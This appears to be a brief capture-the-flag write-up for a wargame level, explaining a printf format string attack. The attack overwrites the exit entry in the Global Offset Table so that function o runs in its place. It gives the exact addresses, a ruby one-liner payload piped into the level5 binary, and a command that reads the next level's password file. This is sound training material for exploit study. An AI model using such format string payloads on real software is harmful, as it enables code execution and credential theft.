- like previous exploit we're going to take advantage printf bad use, but this
time we will modify the Global Offset Table in order to call function o in place
of exit

- using objdump -R we can find exit entry in the GOT @ 0x08049838
- using gdb we find o @ 0x080484a4 (134513828)

- so, as usualy, we need to put target address at the beginning of str in order to
reach it and rewrite the target through $n printf after having printed 134513828 bytes
- printf param (str address) is 16 (4 x 4) bytes far from str, it can be seen as
4th argument in printf argument list
- we can now build our command
	- (ruby -e 'print "\x38\x98\x04\x08" + "%134513824x" + "%4$n"'; cat) | ./level5
	- cat /home/user/level6/.pass
